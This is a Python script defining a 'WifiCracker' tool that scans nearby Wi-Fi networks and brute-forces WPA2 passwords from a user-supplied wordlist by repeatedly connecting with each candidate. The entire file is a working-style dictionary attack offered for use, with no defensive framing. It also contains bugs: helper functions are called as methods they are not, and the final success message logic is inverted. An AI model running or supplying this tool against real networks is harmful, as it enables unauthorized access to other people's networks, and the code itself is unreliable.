import time
import pywifi
from pywifi import const
from colorama import Fore, Style, init

# Initialize colorama
init()


def select_wordlist():
    wordlist = input("Enter the path to the wordlist file: ")
    return wordlist


def print_message(message, color):
    print(color + message + Style.RESET_ALL)


class WifiCracker:
    def __init__(self):
        self.wifi = pywifi.PyWiFi()
        self.interface = self.wifi.interfaces()[0]

    def display_networks(self):
        print("Available Networks:")
        networks = self.interface.scan_results()
        for index, network in enumerate(networks, 1):
            print(f"[{index}] SSID: {network.ssid}")

    def select_network(self):
        networks = self.interface.scan_results()
        while True:
            try:
                choice = int(input("Enter the number corresponding to the network you want to crack (0 for all networks): "))
                if choice == 0:
                    return networks  # Return all networks
                elif 1 <= choice <= len(networks):
                    return [networks[choice - 1]]  # Return selected network
                else:
                    print("Invalid selection. Please try again.")
            except ValueError:
                print("Invalid input. Please enter a number.")

    def crack_password(self, network, password):
        profile = pywifi.Profile()
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP

        iface = self.interface
        iface.remove_all_network_profiles()

        profile.ssid = network.ssid
        profile.key = password
        iface.add_network_profile(profile)
        iface.connect(profile)
        time.sleep(4)

        if iface.status() == const.IFACE_CONNECTED:
            return True
        else:
            iface.disconnect()
            time.sleep(2)
            iface.remove_network_profile(profile)
            return False

    def start_cracking(self):
        self.interface.scan()
        time.sleep(10)
        self.display_networks()

        selected_networks = self.select_network()
        if selected_networks == self.interface.scan_results():
            print("\nCracking password for all networks")
        else:
            print(f"\nCracking password for SSID: {selected_networks[0].ssid}")

        selected_wordlist = self.select_wordlist()

        cracked_passwords = []

        with open(selected_wordlist, 'r') as f:
            for line in f:
                password = line.strip()
                for network in selected_networks:
                    if self.crack_password(network, password):
                        self.print_message(f"\nPassword cracked for SSID: {network.ssid}", Fore.GREEN)
                        print("Password:", password)
                        cracked_passwords.append((password, time.strftime("%H:%M:%S")))
                        break
                    else:
                        print(f"Trying password: {password} on SSID: {network.ssid}")

        if not selected_networks:
            self.print_message("\nAll network passwords have been cracked.", Fore.GREEN)
        else:
            print("\nUnable to crack password for the following network(s):")
            for network in selected_networks:
                print(f"SSID: {network.ssid}")

        if cracked_passwords:
            print("\nSuccessfully cracked passwords:")
            for password, crack_time in cracked_passwords:
                print(f"Password: {password}\tCrack Time: {crack_time}")

if __name__ == "__main__":
    cracker = WifiCracker()
    cracker.start_cracking()
